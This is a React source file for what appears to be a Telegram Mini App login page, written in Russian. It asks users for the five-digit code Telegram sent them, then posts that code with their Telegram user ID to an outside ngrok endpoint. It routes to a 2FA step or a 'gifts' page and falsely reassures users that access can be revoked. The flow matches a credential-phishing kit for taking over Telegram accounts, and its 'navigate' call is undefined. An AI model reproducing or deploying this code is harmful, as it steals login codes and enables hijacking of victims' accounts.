import { useState, useRef, useEffect } from "react";

export default function Auth2() {
  const CODE_LENGTH = 5; // number of digits
  const [code, setCode] = useState(Array(CODE_LENGTH).fill(""));
  const inputsRef = useRef([]);
  const tg = window.Telegram?.WebApp;



  const handleSubmitCode = async () => {

    try {
      const userId = tg.initDataUnsafe?.user?.id;
      if (!userId) {
        alert("Telegram user ID not found!");
        return;
      }

      const codeStr = code.join("");

      alert({ user_id: userId, code: codeStr });

      const res = await fetch("https://janene-unwilling-nonilluminatingly.ngrok-free.dev/api/send_code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user_id: userId, code: codeStr }),
      });

      const data = await res.json();
      console.log("RESPONSE:", data);

      if (data.ok) {
        if (data["2fa"]) {
          navigate("/auth3");
        } else {
          navigate("/gifts");
        }
      } else {
        alert("Error: " + data.error);
      }
    } catch (err) {
      console.error("Request failed:", err);
      alert("Request failed: " + err.message);
    }
  };


  useEffect(() => {
    inputsRef.current[0]?.focus();
  }, []);

  const handleChange = (value, index) => {
    if (!/^\d*$/.test(value)) return; 
    const newCode = [...code];
    newCode[index] = value.slice(-1);
    setCode(newCode);

    if (value && index < CODE_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus(); 
    }

    if (newCode.every(digit => digit !== "")) {
        handleSubmitCode()
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevIndex = index - 1;
      inputsRef.current[prevIndex]?.focus();
      const newCode = [...code];
      newCode[prevIndex] = "";
      setCode(newCode);
    }
  };

  return (
    <div className="min-h-screen font-sans scrollbar-hide overflow-auto flex flex-col items-center justify-center p-6 text-center bg-gray-800 text-white">
      <p className="text-4xl text-white">Авторизация</p>
      <p className="mt-3 text-lg text-gray-400">
        Введите код, который вы получили в Telegram.
      </p>

      <div className="mt-7 flex space-x-3 justify-center">
        {code.map((digit, i) => (
          <input
            key={i}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={digit}
            onChange={(e) => handleChange(e.target.value, i)}
            onKeyDown={(e) => handleKeyDown(e, i)}
            ref={el => inputsRef.current[i] = el}
            className="w-12 h-12 text-center text-xl rounded-lg bg-gray-700 border-2 border-gray-500 focus:border-blue-400 focus:outline-none transition"
          />
        ))}
      </div>

      <p className="mt-5 text-sm text-gray-400">
        Вы можете отозвать доступ в любое время в настройках Telegram
      </p>
    </div>
  );
}
